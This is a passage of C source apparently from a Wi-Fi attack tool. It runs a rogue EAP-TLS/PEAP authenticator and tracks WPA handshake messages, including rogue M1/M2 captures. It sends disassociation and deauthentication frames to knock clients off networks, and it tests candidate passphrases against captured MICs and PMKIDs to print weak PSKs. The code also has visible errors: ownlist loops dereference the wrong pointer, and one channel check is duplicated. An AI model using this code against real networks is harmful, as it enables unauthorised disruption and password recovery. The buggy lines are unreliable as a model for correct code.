		snprintf(outstr, STATUSMSG_MAX, "TLS warning: indicated tlslen != received buflen (%d != %d)\n", eaptlsctx->tlslen, (int)eaptlsctx->buflen);
		debugprint(0, NULL, outstr);
		}
#endif
	if(eaptlsctx->fragments_rx == true)
		BIO_write(eaptlsctx->tls_in, &eaptlsctx->buf, eaptlsctx->buflen);
	else
		BIO_write(eaptlsctx->tls_in, &exteap->data[tlsdataoffset], tlsdatalen);
	eaptlsctx->buflen = 0;
	eaptlsctx->fragments_rx = false;
	eaptlsctx->fragments_tx = false;
	if((SSL_get_shutdown(eaptlsctx->ssl) & SSL_SENT_SHUTDOWN) == SSL_SENT_SHUTDOWN)
		{
		res = SSL_shutdown(eaptlsctx->ssl);
#ifdef DEBUG_TLS
		if(res == 1) debugprint(0, NULL, "TLS received close notify");
#endif
		eapctx->tlstun = false;
		SSL_free(eaptlsctx->ssl);
		eaptlsctx->ssl = NULL;
		return;
		}
	if(!SSL_is_init_finished(eaptlsctx->ssl))
		{
		ERR_clear_error();
		res = SSL_accept(eaptlsctx->ssl);
		if(res == 1)
			{
			if((statusout &STATUS_EAP) == STATUS_EAP)
				{
				snprintf(outstr, STATUSMSG_MAX, "EAP TLS connect EAPTIME:%" PRIu64, timestamp -lastauthtimestamp);
				printown(zeiger, outstr);
				}
			}
		else
			{
			err = SSL_get_error(eaptlsctx->ssl, res);
			tlsabort = false;
			if((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE))
				{
				tlserror = ERR_get_error();
#ifdef DEBUG_TLS
				snprintf(debugmsg, DEBUGMSG_MAX, "TLS Error %d, tlserror %" PRIu64 " reason %d level %d ", err, (uint64_t)tlserror, ERR_GET_REASON(tlserror), ERR_FATAL_ERROR(tlserror));
				debugprint(0, NULL, debugmsg);
#endif
				if(ERR_FATAL_ERROR(tlserror)) tlsabort = true;
				switch(ERR_GET_REASON(tlserror))
					{
					case SSL_R_TLSV1_ALERT_UNKNOWN_CA:
					case SSL_R_DECRYPTION_FAILED_OR_BAD_RECORD_MAC:
						tlsabort = true;
						break;
					}
				if(tlsabort == true)
					{
					SSL_free(eaptlsctx->ssl);
					eaptlsctx->ssl = NULL;
					eapctx->tlstun = false;
					send_eap_status_resp(EAP_CODE_FAILURE, eapctx->id, eapctx->type);
					if((statusout &STATUS_EAP) == STATUS_EAP)
						{
						snprintf(outstr, STATUSMSG_MAX, "EAP TLS abort '%s' EAPTIME:%" PRIu64, ERR_reason_error_string(tlserror), timestamp -lastauthtimestamp);
						printown(zeiger, outstr);
						}
					while(++eapctx->reqstate < eapreqentries)
						{
						if(eapreqlist[eapctx->reqstate].mode == EAPREQLIST_MODE_TLS) continue;
						eapctx->id++;
						eapctx->type = eapreqlist[eapctx->reqstate].type;
						send_eap_request(eapctx->id, eapreqlist[eapctx->reqstate].type, eapreqlist[eapctx->reqstate].data, eapreqlist[eapctx->reqstate].length);
						break;
						}
					if(eapctx->reqstate == eapreqentries)
						{
						send_deauthentication2client(macfrx->addr2, macfrx->addr1, WLAN_REASON_IEEE_802_1X_AUTH_FAILED);	
						}
					return;
					}
				}
#ifdef DEBUG_TLS
			if(err == SSL_ERROR_WANT_READ)
				debugprint(0, NULL, "TLS SSL_connect - want more data");
			else if(err == SSL_ERROR_WANT_WRITE)
				debugprint(0, NULL, "TLS SSL_connect - want to write");
#endif
			}
		send_eap_tls(eapctx, NULL, 0);
		return;
		}
	else
		{
		res = SSL_read(eaptlsctx->ssl, inbuf, sizeof(inbuf));
#ifdef DEBUG_TLS
		snprintf(debugmsg, DEBUGMSG_MAX, "TLS connection read len=%d, id=%d:", res, eapctx->id);
		debugprint(res, inbuf, debugmsg);
#endif
		if(res > 0)
			{
			if(eapctx->type == EAP_TYPE_PEAP)
				{
				memcpy(payloadptr +LLC_SIZE +EAPAUTH_SIZE, inbuf, res);
				memcpy(payloadptr +LLC_SIZE +2, inbuf +2, 2);
				packetlen = packetlen -exteaplen +res;
				}
			else
				{
				memcpy(payloadptr +LLC_SIZE +EAPAUTH_SIZE +EXTEAP_SIZE, inbuf, res);
				inbuflen = htons(res +EXTEAP_SIZE);
				((eapauth_t*)(payloadptr +LLC_SIZE))->len = inbuflen;
				outexteap = ((exteap_t*)(payloadptr +LLC_SIZE +EAPAUTH_SIZE));
				outexteap->code = EAP_CODE_REQ;
				outexteap->id = 0xff;
				outexteap->type = eapctx->type;
				outexteap->len = inbuflen;
				packetlen = packetlen -exteaplen +EXTEAP_SIZE +res;
				}
			if(fd_pcapng > 0)
				{
				if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
				}
			}
		if(eapctx->type == EAP_TYPE_PEAP)
			process80211exteaptls_resp_eap(zeiger, inbuf, res);
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap(int authlen)
{
static uint8_t *eapauthptr;
static exteap_t *exteap;
static uint16_t exteaplen;
static uint8_t lastpacket[EAP_LEN_MAX];

eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
exteaplen = ntohs(exteap->len);
if(exteaplen > authlen) return;
if(eaptunflag == true)
	{
	memcpy(&lastpacket, exteap, exteaplen);
	switch(exteap->type)
		{
		case EAP_TYPE_PEAP:
		case EAP_TYPE_TTLS:
		case EAP_TYPE_TLS:
			if(exteap->code == EAP_CODE_RESP)
				{
				process80211exteap_resp_tls(exteaplen);
				return;
				}
			break;
		}
	}
if(exteap->type == EAP_TYPE_ID)
	{
	if(exteap->code == EAP_CODE_REQ) process80211exteap_req_id(exteaplen);
	else if(exteap->code == EAP_CODE_RESP) process80211exteap_resp_id(exteaplen);
	}
if(exteap->type > EAP_TYPE_ID)
	{
	if(exteap->code == EAP_CODE_RESP) process80211exteap_resp(exteaplen);
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool detectweakwpa(uint8_t keyver, uint8_t essidlen, uint8_t *essid, uint8_t *anonce)
{
static int authlen;
static uint8_t *pmk;
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint8_t *pkeptr;

static uint8_t keymic[16];
static uint8_t pkedata[102];
static uint8_t eapoltmp[1024];
static uint8_t testptk[256];
static uint8_t testmic[32];

pmk = getpmk(essidlen, essid);
if(pmk == NULL) return false;
eapauthptr = payloadptr +LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
wpakptr = eapauthptr +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
memcpy(keymic, wpak->keymic, 16);
memset(wpak->keymic, 0, 16);
memset(testmic, 0, 32);
memset(eapoltmp, 0, sizeof(eapoltmp));
memcpy(eapoltmp, eapauthptr, authlen +EAPAUTH_SIZE);


if((keyver == 1) || (keyver == 2))
	{
	memset(pkedata, 0, sizeof(pkedata));
	pkeptr = pkedata;
	memcpy(pkeptr, "Pairwise key expansion", 23);
	if(memcmp(macfrx->addr1, macfrx->addr2, 6) < 0)
		{
		memcpy(pkeptr +23, macfrx->addr1, 6);
		memcpy(pkeptr +29, macfrx->addr2, 6);
		}
	else
		{
		memcpy(pkeptr +23, macfrx->addr2, 6);
		memcpy(pkeptr +29, macfrx->addr1, 6);
		}
	if(memcmp(anonce, wpak->nonce, 32) < 0)
		{
		memcpy (pkeptr +35, anonce, 32);
		memcpy (pkeptr +67, wpak->nonce, 32);
		}
	else
		{
		memcpy (pkeptr +35, wpak->nonce, 32);
		memcpy (pkeptr +67, anonce, 32);
		}
	if(!EVP_MAC_init(ctxhmac, pmk, 32, paramssha1)) return false;
	if(!EVP_MAC_update(ctxhmac, pkedata, 100)) return false;
	if(!EVP_MAC_final(ctxhmac, testptk, NULL, 256)) return false;
	if(keyver == 2)
		{
		if(!EVP_MAC_init(ctxhmac, testptk, 16, paramssha1)) return false;
		if(!EVP_MAC_update(ctxhmac, eapoltmp, authlen +EAPAUTH_SIZE)) return false;
		if(!EVP_MAC_final(ctxhmac, testmic, NULL, 32)) return false;
		}
	if(keyver == 1)
		{
		if(!EVP_MAC_init(ctxhmac, testptk, 16, paramsmd5)) return false;
		if(!EVP_MAC_update(ctxhmac, eapoltmp, authlen +EAPAUTH_SIZE)) return false;
		if(!EVP_MAC_final(ctxhmac, testmic, NULL, 32)) return false;
		}
	}
else if(keyver == 3)
	{
	memset(pkedata, 0, sizeof(pkedata));
	pkedata[0] = 1;
	pkedata[1] = 0;
	pkeptr = pkedata +2;
	memcpy(pkeptr, "Pairwise key expansion", 22);
	if(memcmp(macfrx->addr1, macfrx->addr2, 6) < 0)
		{
		memcpy(pkeptr +22, macfrx->addr1, 6);
		memcpy(pkeptr +28, macfrx->addr2, 6);
		}
	else
		{
		memcpy(pkeptr +22, macfrx->addr2, 6);
		memcpy(pkeptr +28, macfrx->addr1, 6);
		}
	if(memcmp(anonce, wpak->nonce, 32) < 0)
		{
		memcpy (pkeptr +34, anonce, 32);
		memcpy (pkeptr +66, wpak->nonce, 32);
		}
	else
		{
		memcpy (pkeptr +34, wpak->nonce, 32);
		memcpy (pkeptr +66, anonce, 32);
		}
	pkedata[100] = 0x80;
	pkedata[101] = 1;
	if(!EVP_MAC_init(ctxhmac, pmk, 32, paramssha256)) return false;
	if(!EVP_MAC_update(ctxhmac, pkedata, 102)) return false;
	if(!EVP_MAC_final(ctxhmac, testptk, NULL, 102)) return false;
	if(!EVP_MAC_init(ctxcmac, testptk, 16, paramsaes128)) return false;
	if(!EVP_MAC_update(ctxcmac, eapoltmp, authlen +EAPAUTH_SIZE)) return false;
	if(!EVP_MAC_final(ctxcmac, testmic, NULL, 32)) return false;
	}
if(memcmp(keymic, testmic, 16) == 0) return true;
return false;
}

/*===========================================================================*/
static inline void printeapol(uint8_t *client, uint8_t *ap, char *msg, uint64_t timegap, uint64_t rc, uint8_t kdv, uint8_t *anonce)
{
static int c, p;
static macessidlist_t *zeiger;
static ownlist_t *zeigerown;
static bool pmkflag;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

pmkflag = false;
essidstring[0] = 0;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->ap, ap, 6) == 0)
		{
		if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0)) pmkflag = detectweakwpa(kdv, zeiger->essidlen, zeiger->essid, anonce);
		p = 0;
		for(c = 0; c < zeiger->essidlen; c++)
			{
			if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
			else if(zeiger->essid[c] == 0x5c)
				{
				essidstring[p++] = 0x5c;
				essidstring[p++] = 0x5c;
				}
			else essidstring[p++] = zeiger->essid[c];
			}
		essidstring[p] = 0;
		break;
		}
	}
if(essidstring[0] == 0)
	{
	for(zeiger = rglist; zeiger < rglist +RGLIST_MAX; zeiger++)
		{
		if(memcmp(zeiger->ap, ap, 6) == 0)
			{
			if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0)) pmkflag = detectweakwpa(kdv, zeiger->essidlen, zeiger->essid, anonce);
			p = 0;
			for(c = 0; c < zeiger->essidlen; c++)
				{
				if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeiger->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeiger->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
if(essidstring[0] == 0)
	{
	for(zeigerown = ownlist; zeigerown < ownlist +OWNLIST_MAX; zeigerown++)
		{
		if(memcmp(zeigerown->ap, ap, 6) == 0)
			{
			if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0)) pmkflag = detectweakwpa(kdv, zeiger->essidlen, zeiger->essid, anonce);
			p = 0;
			for(c = 0; c < zeigerown->essidlen; c++)
				{
				if((zeigerown->essid[c] < 0x20) || (zeigerown->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerown->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerown->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(essidstring[0] != 0)
	{
	if(pmkflag == false)
		{
		if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
							essidstring, msg, timegap, rc, kdv);
		else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
							essidstring, msg, timegap, rc, kdv);
		else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
				client[0], client[1], client[2], client[3], client[4], client[5],
				ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
				essidstring, msg, timegap, rc, kdv);
		}
	else
		{
		if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d PSK:%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
							essidstring, msg, timegap, rc, kdv, weakcandidate);
		else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d PSK:%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
							essidstring, msg, timegap, rc, kdv, weakcandidate);
		else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d PSK:%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
				client[0], client[1], client[2], client[3], client[4], client[5],
				ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
				essidstring, msg, timegap, rc, kdv, weakcandidate);
		}
	}
else
	{
	if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						client[0], client[1], client[2], client[3], client[4], client[5],
						ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
						msg, timegap, rc, kdv);
	else if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
						client[0], client[1], client[2], client[3], client[4], client[5],
						ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
						msg, timegap, rc, kdv);
	else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x [ESSID NOT RECEIVED YET] [EAPOL:%s EAPOLTIME:%" PRIu64 " RC:%" PRIu64 " KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			client[0], client[1], client[2], client[3], client[4], client[5],
			ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
			msg, timegap, rc, kdv);
	}
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m4(uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static uint64_t rc;
static uint8_t keyver;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
memset(&lastauthap, 0, 6);
memset(&lastauthclient, 0, 6);
lastauthtimestamp = 0;
wpak = (wpakey_t*)wpakptr;
rc = be64toh(wpak->replaycount);
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if((lastkeyinfo == 3) && (lastkeyver == keyver) && (lastrc == rc)
	&& ((timestamp -lasttimestamp) <= eapoltimeoutvalue)
	&& (memcmp(&lastap, macfrx->addr1, 6) == 0)
	&& (memcmp(&lastclient, macfrx->addr2, 6) == 0))
		{
		if(memcmp(wpak->nonce, &zeroed32, 32) == 0)
			{
			if(addownap(AP_M3M4ZEROED, macfrx->addr1) == true)
				{
				eapolmp34zeroedcount++;
				if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M3M4ZEROED", timestamp -lasttimestamp, rc, keyver, lastanonce);
				}
			else
				{
				eapolmp34count++;
				if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M3M4", timestamp -lasttimestamp, rc, keyver, lastanonce);
				}
			}
		}
else
	{
	if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
	}
lasttimestamp = timestamp;
memcpy(&lastap, macfrx->addr1, 6);
memcpy(&lastclient, macfrx->addr2, 6);
lastrc = rc;
lastkeyinfo = keyinfo;
lastkeyver = keyver;
return;
}
/*===========================================================================*/
static inline void process80211eapol_m3(uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static uint64_t rc;
static uint8_t keyver;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(macfrx->addr2);
memset(&lastauthap, 0, 6);
memset(&lastauthclient, 0, 6);
lastauthtimestamp = 0;
wpak = (wpakey_t*)wpakptr;
rc = be64toh(wpak->replaycount);
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
memcpy(&lastanonce, wpak->nonce, 32);
if((lastkeyinfo == 2) && (lastkeyver == keyver) && (lastrc == (rc -1))
	&& ((timestamp -lasttimestamp) <= eapoltimeoutvalue)
	&& (memcmp(&lastap, macfrx->addr2, 6) == 0)
	&& (memcmp(&lastclient, macfrx->addr1, 6) == 0))
		{
		if((addown(OW_M2M3, macfrx->addr1, macfrx->addr2) == true) || (addownap(AP_M2M3, macfrx->addr2) == true))
			{
			eapolmp23count++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr1, macfrx->addr2, "M2M3", timestamp -lasttimestamp, rc, keyver, lastsnonce);
			}
		}
lasttimestamp = timestamp;
memcpy(&lastap, macfrx->addr2, 6);
memcpy(&lastclient, macfrx->addr1, 6);
lastrc = rc;
lastkeyinfo = keyinfo;
lastkeyver = keyver;
return;
}
/*===========================================================================*/
static inline void process80211eapol_m2(uint8_t keyinfo, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static uint64_t rc;
static uint8_t keyver;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
wpak = (wpakey_t*)wpakptr;
rc = be64toh(wpak->replaycount);
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
if(rc == myrc)
	{
	if((lastauthkeyver == keyver) && ((timestamp -lastauthtimestamp) <= eapoltimeoutvalue) && (memcmp(&lastauthap, macfrx->addr1, 6) == 0) && (memcmp(&lastauthclient, macfrx->addr2, 6) == 0))
		{
		if(addown(OW_M1M2ROGUE, macfrx->addr2, macfrx->addr1) == true)
			{
			eapolmp12roguecount++;
			if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M1M2ROGUE", timestamp -lastauthtimestamp, rc, keyver, myanonce);
			}
		lastauthtimestamp = 0;
		memset(&lastauthap, 0, 6);
		memset(&lastauthclient, 0, 6);
		lastauthkeyver = 0;
		return;
		}
	return;
	}
else
	{
	memcpy(&lastsnonce, wpak->nonce, 32);
	if(lastrc == rc)
		{
		if((lastkeyinfo == 1) && (lastkeyver == keyver) && (lastrc == rc)
			&& ((timestamp -lasttimestamp) <= eapoltimeoutvalue)
			&& (memcmp(&lastap, macfrx->addr1, 6) == 0)
			&& (memcmp(&lastclient, macfrx->addr2, 6) == 0))
			{
			if(addownap(AP_M1M2, macfrx->addr1) == true)
				{
				eapolmp12count++;
				if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printeapol(macfrx->addr2, macfrx->addr1, "M1M2", timestamp -lasttimestamp, rc, keyver, lastanonce);
				}
			}
		}
	}
lasttimestamp = timestamp;
memcpy(&lastap, macfrx->addr1, 6);
memcpy(&lastclient, macfrx->addr2, 6);
lastrc = rc;
lastkeyinfo = keyinfo;
lastkeyver = keyver;
return;
}
/*===========================================================================*/
static inline bool detectweakpmkid(uint8_t *macclient, uint8_t *macap, uint8_t *pmkid, uint8_t essidlen, uint8_t *essid)
{
static uint8_t *pmk;
static char *pmkname = "PMK Name";

static uint8_t pmkidcalculated[128];

pmk = getpmk(essidlen, essid);
if(pmk == NULL) return false;
memcpy(pmkidcalculated, pmkname, 8);
memcpy(&pmkidcalculated[8], macap, 6);
memcpy(&pmkidcalculated[14], macclient, 6);
if(!EVP_MAC_init(ctxhmac, pmk, 32, paramssha1)) return false;
if(!EVP_MAC_update(ctxhmac, pmkidcalculated, 20)) return false;
if(!EVP_MAC_final(ctxhmac, pmkidcalculated, NULL, 20)) return false;
if(memcmp(pmkid, pmkidcalculated, 16) == 0) return true;
return false;
}
/*===========================================================================*/
static inline void printpmkid(uint8_t *client, uint8_t *ap, uint8_t *pmkid, uint8_t kdv, char *msg)
{
static int c, p;
static macessidlist_t *zeiger;
static ownlist_t *zeigerown;
static bool pmkflag;
static char timestring[16];
static char essidstring[ESSID_LEN_MAX *2 +1];

pmkflag = false;
essidstring[0] = 0;
for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->ap, ap, 6) == 0)
		{
		if((zeiger->essidlen != 0) && (zeiger->essid[0] != 0))
		pmkflag = detectweakpmkid(client, ap, pmkid, zeiger->essidlen, zeiger->essid);
		p = 0;
		for(c = 0; c < zeiger->essidlen; c++)
			{
			if((zeiger->essid[c] < 0x20) || (zeiger->essid[c] > 0x7e)) essidstring[p++] = '.';
			else if(zeiger->essid[c] == 0x5c)
				{
				essidstring[p++] = 0x5c;
				essidstring[p++] = 0x5c;
				}
			else essidstring[p++] = zeiger->essid[c];
			}
		essidstring[p] = 0;
		break;
		}
	}
if(essidstring[0] == 0)
	{
	for(zeigerown = ownlist; zeigerown < ownlist +OWNLIST_MAX; zeigerown++)
		{
		if(memcmp(zeigerown->ap, ap, 6) == 0)
			{
			pmkflag = detectweakpmkid(client, ap, pmkid, zeiger->essidlen, zeiger->essid);
			p = 0;
			for(c = 0; c < zeigerown->essidlen; c++)
				{
				if((zeigerown->essid[c] < 0x20) || (zeigerown->essid[c] > 0x7e)) essidstring[p++] = '.';
				else if(zeigerown->essid[c] == 0x5c)
					{
					essidstring[p++] = 0x5c;
					essidstring[p++] = 0x5c;
					}
				else essidstring[p++] = zeigerown->essid[c];
				}
			essidstring[p] = 0;
			break;
			}
		}
	}

strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
if(essidstring[0] != 0)
	{
	if(pmkflag == false)
		{
		if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
							pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
							pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
							kdv);
		else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
							pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
							pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
							kdv);
		else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
				client[0], client[1], client[2], client[3], client[4], client[5],
				ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
				pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
				pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
				kdv);
		}
	else
		{
		if(ptrfscanlist->channel >= 100) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d PSK:%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
							pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
							pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
							kdv, weakcandidate);
		else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d PSK:%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
							client[0], client[1], client[2], client[3], client[4], client[5],
							ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
							pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
							pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
							kdv, weakcandidate);
		else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x KDV:%d PSK:%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
				client[0], client[1], client[2], client[3], client[4], client[5],
				ap[0], ap[1], ap[2], ap[3], ap[4], ap[5], essidstring, msg,
				pmkid[0], pmkid[1], pmkid[2], pmkid[3], pmkid[4], pmkid[5], pmkid[6], pmkid[7],
				pmkid[8], pmkid[9], pmkid[10], pmkid[11], pmkid[12], pmkid[13], pmkid[14], pmkid[15],
				kdv, weakcandidate);
		}
	}
else
	{
